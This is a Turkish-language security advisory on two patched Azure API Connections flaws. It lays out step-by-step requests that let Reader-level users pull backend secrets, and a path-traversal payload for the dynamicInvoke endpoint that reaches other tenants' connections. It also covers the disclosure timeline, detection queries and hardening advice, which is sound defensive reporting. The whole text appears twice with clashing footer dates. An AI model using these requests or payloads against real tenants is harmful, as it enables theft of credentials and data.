# Azure API Connections Expose Backend Secrets

> **İlk Keşif Tarihi:** Ocak 2025 (Binary Security — intra-tenant)  
> **İkinci Keşif:** Ağustos 2025 (cross-tenant — $40,000 bug bounty)  
> **Platform:** Microsoft Azure — API Connections (Logic Apps / ARM)  
> **Saldırı Tipi:** Privilege Escalation + Credential Exfiltration + Cross-Tenant Compromise  
> **Keşfedenler:** Haakon Gulbrandsrud (Binary Security)  
> **Durum:** Microsoft tarafından yamalandı

---

## Özet

Azure API Connections, Logic Apps ve diğer Azure hizmetlerinin üçüncü taraf servislere (Jira, Salesforce, Slack vb.) ve Azure kaynaklarına (Key Vault, SQL, Storage) bağlanmasını sağlar. İki farklı güvenlik araştırması, bu bileşende kritik güvenlik açıkları ortaya çıkardı:

1. **Binary Security (Ocak 2025):** Abonelik üzerinde salt okuma (Reader) iznine sahip bir kullanıcının, API Connection proxy endpoint'leri aracılığıyla tüm bağlantılı backend kaynaklarına tam erişim sağlayabilmesi.

2. **Cross-Tenant Saldırısı (Ağustos 2025):** Herhangi bir Azure tenant'ındaki Contributor erişimine sahip bir saldırganın, **başka tenant'lardaki** API Connection'larını tamamen ele geçirebilmesi; Key Vault'lar, SQL veritabanları ve üçüncü taraf servisler dahil.

---

## Teknik Detaylar — İntra-Tenant (Binary Security)

### Sorunun Kökü

Azure Management API'de GET (okuma) ve POST (yazma) metodları arasındaki tutarsız yetkilendirme yaklaşımı:

```
Azure'un Güvenlik Modeli (Teorik):
├── GET istekleri → Reader izni yeterli
└── POST/PUT/DELETE → Contributor veya üstü gerekli

Gerçek Durum (API Connections):
└── GET /extensions/proxy/{connection-id}/{path}
    → Tüm backend GET isteklerini proxy'ler
    → READER izniyle çalıştırılabilir
    → Backend servisi, isteğin Logic App'ten mi yoksa
      reader'dan mı geldiğini ayırt edemez
```

### Saldırı Akışı

```bash
# Adım 1: Abonelikte Reader iznine sahip kullanıcı olun
# (Saldırı için yeterli)

# Adım 2: API Connection kaynaklarını listeleyin
az resource list \
  --resource-type Microsoft.Web/connections \
  --query "[].{name:name, rg:resourceGroup}"

# Adım 3: Connection'ın swagger tanımını alın (hangi endpoint'ler mevcut?)
GET https://management.azure.com/subscriptions/{subId}/resourceGroups/{rg}/
    providers/Microsoft.Web/connections/{connName}?api-version=2016-06-01

# Adım 4: Proxy endpoint'i aracılığıyla backend'e erişin
GET https://management.azure.com/subscriptions/{subId}/resourceGroups/{rg}/
    providers/Microsoft.Web/connections/{connName}/extensions/proxy/keys/list

# Sonuç: Key Vault secret'ları, SQL credentials, Jira/Salesforce token'ları
#        doğrudan döndürülür!
```

### Etkilenen Bağlantı Türleri

```
Azure İç Kaynaklar:         Dış Servisler:
├── Azure Key Vault          ├── Jira
├── Azure SQL Database       ├── Salesforce
├── Azure Storage Blobs      ├── Slack
└── Microsoft Defender ATP   └── ServiceNow vb.
```

---

## Teknik Detaylar — Cross-Tenant Saldırı (Ağustos 2025)

### DynamicInvoke Endpoint'i

Araştırmacı, Azure Resource Manager'ın API Connection'ları çağırmak için kullandığı belgelenmemiş bir endpoint keşfetti:

```
POST https://management.azure.com/subscriptions/{subId}/resourceGroups/{rg}/
     providers/Microsoft.Web/connections/{connId}/dynamicInvoke?api-version=2016-06-01

{
  "path": "/<backend-action>",
  "method": "GET",
  "queries": {},
  "headers": {}
}
```

### Path Traversal ile Cross-Tenant Erişim

```
Tasarımın Varsayımı: path parametresi güvenli bir şekilde doğrulanır
Gerçek Durum: Path traversal mümkün

Kötü niyetli istek:
{
  "path": "../../../../[VictimConnectorType]/[VictimConnectionID]/[action]",
  "method": "GET"
}

Çalışma Prensibi:
1. ARM, kendi super-privileged token'ıyla APIM instance'ına bağlanır
2. Path traverse edilerek kurban tenant'ın connection'ına erişilir
3. APIM, ARM token'ına güvenerek backend'e kimlik doğrulamasıyla bağlanır
4. Kurban tenant'ın Key Vault'u tam erişim verir
```

### Saldırı Gereksinimleri

- **Başlangıç erişimi:** Herhangi bir Azure tenant'ında Contributor düzeyinde erişim
- **Hedef:** Dünyadaki herhangi bir API Connection
- **Tespit:** Neredeyse imkansız (cross-tenant log'lar kurban tenant'ta oluşmaz)

---

## Etki Analizi

### İntra-Tenant Saldırı

```
Etki Kapsamı: Abonelik içindeki tüm API Connection backend'leri
Gerekli Erişim: Abonelikte Reader rolü
Veri Erişimi:
├── Key Vault secret'ları (şifreler, API anahtarları, sertifikalar)
├── SQL veritabanları (tam okuma erişimi)
└── Tüm bağlantılı harici servis kimlik bilgileri
```

### Cross-Tenant Saldırı (Daha Kritik)

```
Etki Kapsamı: GLOBAL — dünyadaki tüm Azure tenant'ları
Gerekli Erişim: Herhangi bir Azure tenant'ında Contributor
Veri Erişimi:
├── Tüm Key Vault secret'ları (cross-tenant)
├── Azure SQL veritabanları (cross-tenant)
└── Jira, Salesforce, GitHub, Slack token'ları (cross-tenant)
```

**Araştırmacının ifadesiyle:** *"API Connection'lar, dünya genelindeki herhangi bir başka bağlantıyı tamamen tehlikeye atmayı, bağlı backend kaynaklara tam erişim sağlamayı mümkün kılar."*

---

## Microsoft'un Yanıtı

### İntra-Tenant Açığı (Ocak 2025)

```
Süreç:
6 Ocak  → Binary Security, problemi raporlar (genel API Connections + Jira özel)
7 Ocak  → Microsoft ilk durumda kapatır "Geçersiz"
7 Ocak  → Binary Security daha ayrıntılı raporla tekrar gönderir
10 Ocak → Microsoft güvenlik açığını doğrular
12-17 Ocak → Microsoft düzeltme uygular:
             /extensions/proxy endpoint'ini yalnızca "testrequests" için sınırlar
30 Ocak → Jira bileti yanıtlanır (artık düzeltilmiş durumda)
```

### Cross-Tenant Açığı (Ağustos 2025)

```
7 Nisan 2025 → Araştırmacı DynamicInvoke endpoint'ini keşfeder ve raporlar
10 Nisan     → Microsoft 3 gün içinde doğrular
~17 Nisan    → Bir hafta içinde mitigation uygulanır:
               "../" ve bazı URL-encoded variantları kara listeye alınır
Sonuç        → $40,000 bug bounty ödülü + Black Hat sunumu
```

---

## Tespit

### Azure Activity Log İzleme

```bash
# Şüpheli /extensions/proxy erişimlerini arayın:
az monitor activity-log list \
  --query "[?contains(operationName.value, 'connections/extensions/proxy')]" \
  --output table

# Management API çağrılarını izleyin:
az monitor activity-log list \
  --query "[?starts_with(operationName.value, 'Microsoft.Web/connections')]" \
  --output table
```

### Günlük İzleme Önerileri

```
İzlenecek Anormal Durumlar:
├── Reader izinli kullanıcılardan API Connection erişimleri
├── /extensions/proxy yoluna normalin dışında GET istekleri
├── management.azure.com'dan anormal zamanlarda erişimler
└── API Connection üzerinden yüksek hacimli veri aktarımı
```

---

## Düzeltme ve Önlemler

### Anlık Önlemler (Artık Gerekmiyor — Yamalı)

Açık kapatıldığı için aktif koruma gerektirmez. Ancak proaktif güvenlik için:

### Uzun Vadeli Güvenlik Önerileri

```
1. Minimum Ayrıcalık Prensibi
   → API Connection'lara erişimi gerektiren minimum rolü atayın
   → Reader rolünü dikkatli kullanın

2. API Connection Envanteri
   → Kullanılmayan connection'ları kaldırın
   → Her connection'ın neye eriştiğini belgeleyin

3. Kimlik Bilgisi Döndürme
   → API Connection'larda saklanan token'ları periyodik olarak yenileyin
   → Key Vault referansları kullanın (secret doğrudan saklamak yerine)

4. Koşullu Erişim
   → Logic App'lere kimlik doğrulama politikaları uygulayın
   → API Connection'ları mümkün olduğunda managed identity ile kullanın
```

---

## Kaynaklar

- [Binary Security Teknik Blog](https://binarysecurity.no/posts/2025/03/api-connections)
- [GBHackers — Cross-Tenant Saldırı](https://gbhackers.com/azure-default-api-connection-flaw/)
- [CloudVulnDB](https://www.cloudvulndb.org/azure-api-connections-secrets)
- [Cyberpress Analizi](https://cyberpress.org/azure-api-connection-vulnerability/)

---

*Rapor Tarihi: Nisan 2026 | althack.dev*# Azure API Connections Expose Backend Secrets

> **İlk Keşif Tarihi:** Ocak 2025 (Binary Security — intra-tenant)  
> **İkinci Keşif:** Ağustos 2025 (cross-tenant — $40,000 bug bounty)  
> **Platform:** Microsoft Azure — API Connections (Logic Apps / ARM)  
> **Saldırı Tipi:** Privilege Escalation + Credential Exfiltration + Cross-Tenant Compromise  
> **Keşfedenler:** Haakon Gulbrandsrud (Binary Security)  
> **Durum:** Microsoft tarafından yamalandı

---

## Özet

Azure API Connections, Logic Apps ve diğer Azure hizmetlerinin üçüncü taraf servislere (Jira, Salesforce, Slack vb.) ve Azure kaynaklarına (Key Vault, SQL, Storage) bağlanmasını sağlar. İki farklı güvenlik araştırması, bu bileşende kritik güvenlik açıkları ortaya çıkardı:

1. **Binary Security (Ocak 2025):** Abonelik üzerinde salt okuma (Reader) iznine sahip bir kullanıcının, API Connection proxy endpoint'leri aracılığıyla tüm bağlantılı backend kaynaklarına tam erişim sağlayabilmesi.

2. **Cross-Tenant Saldırısı (Ağustos 2025):** Herhangi bir Azure tenant'ındaki Contributor erişimine sahip bir saldırganın, **başka tenant'lardaki** API Connection'larını tamamen ele geçirebilmesi; Key Vault'lar, SQL veritabanları ve üçüncü taraf servisler dahil.

---

## Teknik Detaylar — İntra-Tenant (Binary Security)

### Sorunun Kökü

Azure Management API'de GET (okuma) ve POST (yazma) metodları arasındaki tutarsız yetkilendirme yaklaşımı:

```
Azure'un Güvenlik Modeli (Teorik):
├── GET istekleri → Reader izni yeterli
└── POST/PUT/DELETE → Contributor veya üstü gerekli

Gerçek Durum (API Connections):
└── GET /extensions/proxy/{connection-id}/{path}
    → Tüm backend GET isteklerini proxy'ler
    → READER izniyle çalıştırılabilir
    → Backend servisi, isteğin Logic App'ten mi yoksa
      reader'dan mı geldiğini ayırt edemez
```

### Saldırı Akışı

```bash
# Adım 1: Abonelikte Reader iznine sahip kullanıcı olun
# (Saldırı için yeterli)

# Adım 2: API Connection kaynaklarını listeleyin
az resource list \
  --resource-type Microsoft.Web/connections \
  --query "[].{name:name, rg:resourceGroup}"

# Adım 3: Connection'ın swagger tanımını alın (hangi endpoint'ler mevcut?)
GET https://management.azure.com/subscriptions/{subId}/resourceGroups/{rg}/
    providers/Microsoft.Web/connections/{connName}?api-version=2016-06-01

# Adım 4: Proxy endpoint'i aracılığıyla backend'e erişin
GET https://management.azure.com/subscriptions/{subId}/resourceGroups/{rg}/
    providers/Microsoft.Web/connections/{connName}/extensions/proxy/keys/list

# Sonuç: Key Vault secret'ları, SQL credentials, Jira/Salesforce token'ları
#        doğrudan döndürülür!
```

### Etkilenen Bağlantı Türleri

```
Azure İç Kaynaklar:         Dış Servisler:
├── Azure Key Vault          ├── Jira
├── Azure SQL Database       ├── Salesforce
├── Azure Storage Blobs      ├── Slack
└── Microsoft Defender ATP   └── ServiceNow vb.
```

---

## Teknik Detaylar — Cross-Tenant Saldırı (Ağustos 2025)

### DynamicInvoke Endpoint'i

Araştırmacı, Azure Resource Manager'ın API Connection'ları çağırmak için kullandığı belgelenmemiş bir endpoint keşfetti:

```
POST https://management.azure.com/subscriptions/{subId}/resourceGroups/{rg}/
     providers/Microsoft.Web/connections/{connId}/dynamicInvoke?api-version=2016-06-01

{
  "path": "/<backend-action>",
  "method": "GET",
  "queries": {},
  "headers": {}
}
```

### Path Traversal ile Cross-Tenant Erişim

```
Tasarımın Varsayımı: path parametresi güvenli bir şekilde doğrulanır
Gerçek Durum: Path traversal mümkün

Kötü niyetli istek:
{
  "path": "../../../../[VictimConnectorType]/[VictimConnectionID]/[action]",
  "method": "GET"
}

Çalışma Prensibi:
1. ARM, kendi super-privileged token'ıyla APIM instance'ına bağlanır
2. Path traverse edilerek kurban tenant'ın connection'ına erişilir
3. APIM, ARM token'ına güvenerek backend'e kimlik doğrulamasıyla bağlanır
4. Kurban tenant'ın Key Vault'u tam erişim verir
```

### Saldırı Gereksinimleri

- **Başlangıç erişimi:** Herhangi bir Azure tenant'ında Contributor düzeyinde erişim
- **Hedef:** Dünyadaki herhangi bir API Connection
- **Tespit:** Neredeyse imkansız (cross-tenant log'lar kurban tenant'ta oluşmaz)

---

## Etki Analizi

### İntra-Tenant Saldırı

```
Etki Kapsamı: Abonelik içindeki tüm API Connection backend'leri
Gerekli Erişim: Abonelikte Reader rolü
Veri Erişimi:
├── Key Vault secret'ları (şifreler, API anahtarları, sertifikalar)
├── SQL veritabanları (tam okuma erişimi)
└── Tüm bağlantılı harici servis kimlik bilgileri
```

### Cross-Tenant Saldırı (Daha Kritik)

```
Etki Kapsamı: GLOBAL — dünyadaki tüm Azure tenant'ları
Gerekli Erişim: Herhangi bir Azure tenant'ında Contributor
Veri Erişimi:
├── Tüm Key Vault secret'ları (cross-tenant)
├── Azure SQL veritabanları (cross-tenant)
└── Jira, Salesforce, GitHub, Slack token'ları (cross-tenant)
```

**Araştırmacının ifadesiyle:** *"API Connection'lar, dünya genelindeki herhangi bir başka bağlantıyı tamamen tehlikeye atmayı, bağlı backend kaynaklara tam erişim sağlamayı mümkün kılar."*

---

## Microsoft'un Yanıtı

### İntra-Tenant Açığı (Ocak 2025)

```
Süreç:
6 Ocak  → Binary Security, problemi raporlar (genel API Connections + Jira özel)
7 Ocak  → Microsoft ilk durumda kapatır "Geçersiz"
7 Ocak  → Binary Security daha ayrıntılı raporla tekrar gönderir
10 Ocak → Microsoft güvenlik açığını doğrular
12-17 Ocak → Microsoft düzeltme uygular:
             /extensions/proxy endpoint'ini yalnızca "testrequests" için sınırlar
30 Ocak → Jira bileti yanıtlanır (artık düzeltilmiş durumda)
```

### Cross-Tenant Açığı (Ağustos 2025)

```
7 Nisan 2025 → Araştırmacı DynamicInvoke endpoint'ini keşfeder ve raporlar
10 Nisan     → Microsoft 3 gün içinde doğrular
~17 Nisan    → Bir hafta içinde mitigation uygulanır:
               "../" ve bazı URL-encoded variantları kara listeye alınır
Sonuç        → $40,000 bug bounty ödülü + Black Hat sunumu
```

---

## Tespit

### Azure Activity Log İzleme

```bash
# Şüpheli /extensions/proxy erişimlerini arayın:
az monitor activity-log list \
  --query "[?contains(operationName.value, 'connections/extensions/proxy')]" \
  --output table

# Management API çağrılarını izleyin:
az monitor activity-log list \
  --query "[?starts_with(operationName.value, 'Microsoft.Web/connections')]" \
  --output table
```

### Günlük İzleme Önerileri

```
İzlenecek Anormal Durumlar:
├── Reader izinli kullanıcılardan API Connection erişimleri
├── /extensions/proxy yoluna normalin dışında GET istekleri
├── management.azure.com'dan anormal zamanlarda erişimler
└── API Connection üzerinden yüksek hacimli veri aktarımı
```

---

## Düzeltme ve Önlemler

### Anlık Önlemler (Artık Gerekmiyor — Yamalı)

Açık kapatıldığı için aktif koruma gerektirmez. Ancak proaktif güvenlik için:

### Uzun Vadeli Güvenlik Önerileri

```
1. Minimum Ayrıcalık Prensibi
   → API Connection'lara erişimi gerektiren minimum rolü atayın
   → Reader rolünü dikkatli kullanın

2. API Connection Envanteri
   → Kullanılmayan connection'ları kaldırın
   → Her connection'ın neye eriştiğini belgeleyin

3. Kimlik Bilgisi Döndürme
   → API Connection'larda saklanan token'ları periyodik olarak yenileyin
   → Key Vault referansları kullanın (secret doğrudan saklamak yerine)

4. Koşullu Erişim
   → Logic App'lere kimlik doğrulama politikaları uygulayın
   → API Connection'ları mümkün olduğunda managed identity ile kullanın
```

---

## Kaynaklar

- [Binary Security Teknik Blog](https://binarysecurity.no/posts/2025/03/api-connections)
- [GBHackers — Cross-Tenant Saldırı](https://gbhackers.com/azure-default-api-connection-flaw/)
- [CloudVulnDB](https://www.cloudvulndb.org/azure-api-connections-secrets)
- [Cyberpress Analizi](https://cyberpress.org/azure-api-connection-vulnerability/)

---

*© 2025 AltHack Security — Gerçek Dünya Siber Güvenlik İstihbaratı*
